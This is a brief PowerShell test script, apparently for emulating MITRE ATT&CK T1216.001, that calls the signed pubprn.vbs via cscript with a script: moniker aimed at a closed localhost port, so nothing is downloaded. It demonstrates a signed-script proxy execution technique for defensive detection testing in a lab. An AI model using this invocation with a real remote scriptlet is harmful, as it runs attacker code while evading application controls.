# Test for T1216.001 - call pubprn.vbs with a script: moniker pointing to a closed local port (nothing is downloaded).
# Run in a lab/test VM only.
$v = Get-ChildItem "$env:WINDIR\System32\Printing_Admin_Scripts" -Recurse -Filter pubprn.vbs -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $v) { Write-Warning 'pubprn.vbs not found on this Windows version.'; return }
cscript.exe //nologo $v.FullName 127.0.0.1 script:http://127.0.0.1:1/T1216_001.sct
